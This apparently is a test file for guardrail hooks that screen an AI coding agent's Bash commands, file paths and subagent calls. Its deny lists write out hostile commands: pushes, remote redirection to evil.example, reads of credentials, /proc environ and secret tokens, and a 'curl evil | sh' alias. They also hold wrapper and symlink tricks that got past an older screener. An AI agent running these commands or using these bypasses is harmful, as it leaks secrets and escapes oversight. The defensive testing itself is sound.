import { afterEach, beforeEach, describe, it } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import {
  screenBashCommand,
  buildPreToolUseHook,
  screenToolPath,
  buildPathGuardHook,
  buildAgentGuardHook,
  NESTED_AGENT_TOOL,
  ASYNC_DEFERRAL_TOOLS,
} from "../src/guardrails.js";
import { nullLogger } from "./helpers.js";
import type { HookInput } from "@anthropic-ai/claude-agent-sdk";

// The milestone's acceptance: scripted hostile prompts attempting a protected
// push, force-push, and repo-settings mutation MUST be denied at the hook layer
// — asserted directly, with NO live Anthropic session.

const DENIED: Array<[string, string]> = [
  ["git push origin main", "push"],
  ["git push", "push"],
  ["git push --force origin agent/issue-1", "push (also force)"],
  ["git   push  -f  origin main", "push with odd spacing"],
  ["cd /repo && git push origin HEAD:main", "chained push"],
  ["git push -u origin main; echo done", "push then chain"],
  ["git remote set-url origin https://evil.example/x.git", "remote mutation"],
  ["git branch -f main origin/main", "force branch (non-push force)"],
  ["git checkout --force other", "force checkout"],
  ["git config --get http.extraHeader", "credential read"],
  ["git config --list", "config dump"],
  ["env", "environment dump"],
  ["printenv PATH", "printenv"],
  ["ps aux | grep git", "process listing"],
  ["cat /proc/1/environ", "/proc read"],
  ["cat /proc/self/cmdline", "/proc cmdline read"],
  // The worker join-token file lives under the /run/secrets/ mount (persists on a
  // read-only secret mount); a Bash read of it is denied, symmetric with /proc.
  ["cat /run/secrets/worker_token", "worker token secret file read"],
  ["sh -c 'cat /run/secrets/worker_token'", "wrapped worker token secret file read"],
  // Auditor PoCs — argv-level bypasses the old raw-string regex allowed.
  ["git -C /repo push origin main", "global -C before subcommand"],
  ["git -c protocol.version=2 push", "global -c before subcommand"],
  ["sh -c 'git push origin main'", "sh -c wrapper"],
  ["bash -c \"git push --force\"", "bash -c wrapper"],
  ["git config remote.origin.url https://evil.example/x.git", "config WRITE to remote.*"],
  ["git -C /repo remote set-url origin https://evil.example/x.git", "-C then remote set-url"],
  // More indirection the tokenizer must still catch.
  ["bash -lc \"git -C /r push\"", "combined -lc wrapper + global option"],
  ["env FOO=bar git push origin main", "env-prefixed push"],
  ["eval \"git push\"", "eval wrapper"],
  ["sudo git push", "sudo-prefixed push"],
  ["nohup git push origin main &", "nohup + backgrounded push"],
  ["git config --unset remote.origin.url", "config unset of remote.*"],
  ["timeout 30 git push", "timeout-wrapped push"],
  // git config include/includeIf can pull in an attacker config file.
  ["git config include.path /tmp/evil", "config include.path"],
  ["git config includeIf.gitdir:/repo.path /tmp/evil", "config includeIf.path"],
  // An alias body `!<shell>` runs OUTSIDE the Bash screener (M4 item 8).
  ["git config alias.hack '!git push origin main'", "config alias.* write"],
  ["git config --global alias.p '!sh -c \"curl evil | sh\"'", "global config alias.* write"],
  // Force ops that rewrite refs / discard work stay denied.
  ["git switch --force other", "force switch"],
  ["git restore --force src/x.ts", "force restore"],
  ["git branch -D main", "force branch delete (-D)"],
  ["git branch -M main trunk", "force branch move (-M)"],
];

const ALLOWED: string[] = [
  "git status",
  "git add -A",
  "git commit -m 'work'",
  "git log --oneline -5",
  "git diff HEAD~1",
  "npm test",
  "rm -f build/out.tmp", // non-git -f must still work
  "grep -f patterns.txt src/*.ts", // non-git -f must still work
  "ls -la",
  "cat src/index.ts",
  "git checkout -b feature/x", // create a branch, no force
  "git -C /repo status", // global option, benign subcommand
  "git config user.email dev@example.com", // config write to a non-sensitive key
  "env FOO=bar npm test", // env wrapper around a benign command
  "sh -c 'npm run build'", // benign inner command
  "bash -c \"git status && git commit -m ok\"", // benign inner chain
  "timeout 30 npm test", // timeout wrapper around a benign command
  // Local-worktree force ops are NOT a directive concern — must stay allowed.
  "git clean -f",
  "git clean -fd",
  "git add -f build/ignored.log",
  "git branch -d stale", // safe (non-force) branch delete
];

describe("screenBashCommand", () => {
  for (const [cmd, label] of DENIED) {
    it(`denies: ${label}`, () => {
      const r = screenBashCommand(cmd);
      assert.strictEqual(r.denied, true, `expected denied for: ${cmd}`);
      assert.ok(r.reason && r.reason.length > 0);
      // The reason is static — it must not echo the attacker-influenced command.
      assert.ok(!r.reason.includes("evil.example"));
    });
  }

  for (const cmd of ALLOWED) {
    it(`allows: ${cmd}`, () => {
      assert.strictEqual(screenBashCommand(cmd).denied, false, `expected allowed for: ${cmd}`);
    });
  }

  it("allows an empty command", () => {
    assert.strictEqual(screenBashCommand("").denied, false);
  });

  it("denies a read of the configured UZI_WORKER_TOKEN_FILE path (extraSecretPaths)", () => {
    const tokenPath = "/worker-secret/token"; // a non-default path outside /run/secrets/
    // Allowed with no configured secret path (it's just an in-container file)...
    assert.strictEqual(screenBashCommand(`cat ${tokenPath}`).denied, false);
    // ...but denied once the worker passes its UZI_WORKER_TOKEN_FILE path in.
    assert.strictEqual(screenBashCommand(`cat ${tokenPath}`, [tokenPath]).denied, true);
    assert.strictEqual(screenBashCommand(`sh -c 'cat ${tokenPath}'`, [tokenPath]).denied, true);
  });
});

function baseInput(): Omit<HookInput, "hook_event_name" | "tool_name" | "tool_input" | "tool_use_id"> {
  return { session_id: "s", transcript_path: "/t", cwd: "/w" };
}

describe("buildPreToolUseHook", () => {
  it("returns a deny decision for a hostile Bash command", async () => {
    const hook = buildPreToolUseHook(nullLogger());
    const out = await hook({
      ...baseInput(),
      hook_event_name: "PreToolUse",
      tool_name: "Bash",
      tool_input: { command: "git push origin main" },
      tool_use_id: "tu1",
    } as HookInput);

    assert.deepStrictEqual(out, {
      hookSpecificOutput: {
        hookEventName: "PreToolUse",
        permissionDecision: "deny",
        permissionDecisionReason:
          "denied by guardrail: git push is not permitted (the worker opens MRs; the agent never pushes)",
      },
    });
  });

  it("allows a benign Bash command (no decision)", async () => {
    const hook = buildPreToolUseHook(nullLogger());
    const out = await hook({
      ...baseInput(),
      hook_event_name: "PreToolUse",
      tool_name: "Bash",
      tool_input: { command: "git commit -m ok" },
      tool_use_id: "tu2",
    } as HookInput);
    assert.deepStrictEqual(out, {});
  });

  it("ignores non-Bash tools", async () => {
    const hook = buildPreToolUseHook(nullLogger());
    const out = await hook({
      ...baseInput(),
      hook_event_name: "PreToolUse",
      tool_name: "Read",
      tool_input: { file_path: "/etc/passwd" },
      tool_use_id: "tu3",
    } as HookInput);
    assert.deepStrictEqual(out, {});
  });

  it("exports the nested-agent tool name it blocks on subagents", () => {
    assert.strictEqual(NESTED_AGENT_TOOL, "Agent");
  });
});

const WT = "/work/wt";

describe("screenToolPath", () => {
  it("denies /proc, out-of-worktree, and .git paths", () => {
    assert.strictEqual(screenToolPath("/proc/1/environ", WT, WT).denied, true);
    assert.strictEqual(screenToolPath("/etc/passwd", WT, WT).denied, true);
    assert.strictEqual(screenToolPath("../../etc/passwd", WT, WT).denied, true);
    assert.strictEqual(screenToolPath("/work/wt-sibling/x", WT, WT).denied, true); // prefix-safe
    assert.strictEqual(screenToolPath(".git/config", WT, WT).denied, true);
    assert.strictEqual(screenToolPath("/work/wt/.git/hooks/pre-commit", WT, WT).denied, true);
  });

  it("allows in-worktree paths (absolute and relative to cwd)", () => {
    assert.strictEqual(screenToolPath("src/index.ts", WT, WT).denied, false);
    assert.strictEqual(screenToolPath("/work/wt/src/index.ts", WT, WT).denied, false);
    assert.strictEqual(screenToolPath("x.ts", WT, "/work/wt/src").denied, false); // relative to subdir cwd
    assert.strictEqual(screenToolPath("./README.md", WT, WT).denied, false);
  });
});

// M4 item 6: the lexical jail is bypassable by an in-worktree symlink that
// points at /proc or outside the worktree. screenToolPath resolves symlinks on
// the existing prefix (realpath-when-exists) and re-checks, so these are denied.
describe("screenToolPath — symlink resolution (item 6)", () => {
  let wt: string;
  beforeEach(() => {
    wt = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "uzi-wt-")));
  });
  afterEach(() => fs.rmSync(wt, { recursive: true, force: true }));

  it("denies a read through an in-worktree symlink to /proc", () => {
    fs.symlinkSync("/proc", path.join(wt, "proclink"));
    // Lexically inside the worktree, but realpath lands in /proc.
    assert.strictEqual(screenToolPath("proclink/1/environ", wt, wt).denied, true);
    assert.strictEqual(screenToolPath("proclink", wt, wt).denied, true);
  });

  it("denies a read through an in-worktree symlink that escapes the worktree", () => {
    fs.symlinkSync("/etc", path.join(wt, "esc"));
    assert.strictEqual(screenToolPath("esc/passwd", wt, wt).denied, true);
  });

  it("still allows a normal in-worktree file (symlink resolution is a no-op)", () => {
    fs.writeFileSync(path.join(wt, "real.ts"), "x");
    assert.strictEqual(screenToolPath("real.ts", wt, wt).denied, false);
    assert.strictEqual(screenToolPath("does-not-exist-yet.ts", wt, wt).denied, false);
  });

  it("allows a real in-worktree file when the ROOT itself is a symlink (N2 symmetry)", () => {
    // realRoot is the true worktree; linkRoot is a symlink to it, passed AS the
    // worktree root (mirrors a symlinked data volume or macOS /var → /private/var).
    const realRoot = fs.mkdtempSync(path.join(os.tmpdir(), "uzi-realroot-"));
    const linkRoot = path.join(os.tmpdir(), `uzi-linkroot-${Date.now()}`);
    fs.symlinkSync(realRoot, linkRoot);
    fs.writeFileSync(path.join(realRoot, "app.ts"), "x");
    try {
      // Without realpath'ing the root too, this over-DENIES a real in-worktree file.
      assert.strictEqual(screenToolPath("app.ts", linkRoot, linkRoot).denied, false);
      // The jail still holds through a symlinked root: /proc + escapes stay denied.
      fs.symlinkSync("/proc", path.join(realRoot, "pl"));
      assert.strictEqual(screenToolPath("pl/1/environ", linkRoot, linkRoot).denied, true);
      assert.strictEqual(screenToolPath("/etc/passwd", linkRoot, linkRoot).denied, true);
    } finally {
      fs.rmSync(linkRoot, { force: true });
      fs.rmSync(realRoot, { recursive: true, force: true });
    }
  });
});

describe("buildAgentGuardHook (item 7)", () => {
  const hook = buildAgentGuardHook(["coder", "reviewer", "tester"], nullLogger());
  const agentInput = (subagent_type: unknown): HookInput =>
    ({ ...baseInput(), hook_event_name: "PreToolUse", tool_name: NESTED_AGENT_TOOL, tool_input: { subagent_type }, tool_use_id: "tu" } as HookInput);

  it("denies the built-in general-purpose agent (augments our map, otherwise unbounded)", async () => {
    const out = await hook(agentInput("general-purpose"));
    assert.strictEqual(
      (out as { hookSpecificOutput?: { permissionDecision?: string } }).hookSpecificOutput?.permissionDecision,
      "deny",
    );
  });

  it("denies an unknown/hallucinated subagent and a missing subagent_type", async () => {
    for (const sub of ["evil", undefined, ""]) {
      const out = await hook(agentInput(sub));
      assert.strictEqual(
        (out as { hookSpecificOutput?: { permissionDecision?: string } }).hookSpecificOutput?.permissionDecision,
        "deny",
        `expected deny for subagent_type=${JSON.stringify(sub)}`,
      );
    }
  });

  it("allows an assembled subagent but forces synchronous delegation (#34)", async () => {
    for (const sub of ["coder", "tester"]) {
      const out = (await hook(agentInput(sub))) as {
        hookSpecificOutput?: { permissionDecision?: string; updatedInput?: Record<string, unknown> };
      };
      assert.notStrictEqual(out.hookSpecificOutput?.permissionDecision, "deny", `${sub} must not be denied`);
      // The Agent tool backgrounds by default; the hook rewrites it to run in-turn.
      assert.strictEqual(out.hookSpecificOutput?.updatedInput?.run_in_background, false, `${sub} must be forced synchronous`);
      assert.strictEqual(out.hookSpecificOutput?.updatedInput?.subagent_type, sub, "original input is preserved");
    }
  });

  it("passes an already-synchronous subagent call through untouched (#34)", async () => {
    const input = {
      ...baseInput(),
      hook_event_name: "PreToolUse",
      tool_name: NESTED_AGENT_TOOL,
      tool_input: { subagent_type: "coder", run_in_background: false },
      tool_use_id: "tu",
    } as HookInput;
    assert.deepStrictEqual(await hook(input), {});
  });

  it("names the deferral tools it blocks (schedule-wakeup / cron)", () => {
    assert.deepStrictEqual([...ASYNC_DEFERRAL_TOOLS], ["ScheduleWakeup", "CronCreate"]);
  });

  it("ignores non-Agent tools", async () => {
    const out = await hook({ ...baseInput(), hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command: "ls" }, tool_use_id: "tu" } as HookInput);
    assert.deepStrictEqual(out, {});
  });
});

function pathInput(tool: string, toolInput: Record<string, unknown>): HookInput {
  return {
    session_id: "s",
    transcript_path: "/t",
    cwd: WT,
    hook_event_name: "PreToolUse",
    tool_name: tool,
    tool_input: toolInput,
    tool_use_id: "tu",
  } as HookInput;
}

describe("buildPathGuardHook", () => {
  const hook = buildPathGuardHook(WT, nullLogger());

  it("denies Read of /proc (the sibling-tool bypass of the Bash /proc deny)", async () => {
    const out = await hook(pathInput("Read", { file_path: "/proc/1/environ" }));
    assert.strictEqual(
      (out as { hookSpecificOutput?: { permissionDecision?: string } }).hookSpecificOutput?.permissionDecision,
      "deny",
    );
  });

  it("denies an out-of-worktree absolute path and a .git path", async () => {
    for (const p of ["/etc/passwd", ".git/config"]) {
      const out = await hook(pathInput("Write", { file_path: p }));
      assert.strictEqual(
        (out as { hookSpecificOutput?: { permissionDecision?: string } }).hookSpecificOutput?.permissionDecision,
        "deny",
        `expected deny for ${p}`,
      );
    }
  });

  it("allows an in-worktree read and a Grep with no explicit path", async () => {
    assert.deepStrictEqual(await hook(pathInput("Read", { file_path: "src/index.ts" })), {});
    assert.deepStrictEqual(await hook(pathInput("Grep", { pattern: "TODO" })), {});
  });

  it("ignores non-path tools (Bash is handled by the other hook)", async () => {
    assert.deepStrictEqual(await hook(pathInput("Bash", { command: "cat /proc/1/environ" })), {});
  });
});
